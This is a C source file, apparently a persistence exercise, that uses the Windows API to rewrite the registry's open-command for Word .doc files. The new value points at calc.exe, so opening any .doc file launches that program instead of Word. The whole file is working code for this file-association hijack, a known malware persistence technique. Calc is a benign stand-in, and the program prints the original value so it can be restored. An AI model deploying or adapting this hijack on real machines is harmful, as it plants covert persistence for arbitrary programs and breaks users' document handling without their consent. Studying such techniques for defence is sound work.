/*
Name: ex5_Persistence_winapi.c
Author: dipper pine
Date: 26.7.2026
Description: this code opens calc.exe when opened a .doc file
includes & more
*/
#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment( lib ,"advapi32.lib")

/* path to registry 
* Computer\HKEY_CLASSES_ROOT\Word.Document.8\shell\Open\command
! value changed -> "C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "%1" /o "%u"
! by the name -> (Defaulte)
*/


int main ()
{
    HKEY hk = HKEY_CLASSES_ROOT;
    WCHAR  calc[] = L"C:\\Windows\\SysWOW64\\calc.exe";
    LSTATUS working = ERROR_SUCCESS;
    char og_vlue[] = "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"%1\" /o \"\%u\"";
    WCHAR kLocation[] = L"Word.Document.8\\shell\\Open\\command";

    // obtain handle and handle error
    if (RegOpenKeyExW(hk, (LPCWSTR)&kLocation ,0, KEY_SET_VALUE, &hk) != working)
    {
        printf("couldn't obtein key\n");
        system("pause");
        return 1;
    }

    //change value and handle error
    if (RegSetValueW(hk, NULL, REG_SZ, (LPCWSTR)&calc, sizeof(calc)) != working)
    {
        printf("couldn't change value\n");
        RegCloseKey(hk);
        system("pause");
        return 1; 
    }
    printf ("the original value so u wont destroy your computer \n%s\n", og_vlue);

    RegCloseKey(hk);    
    system("pause");
         
    return 0;
}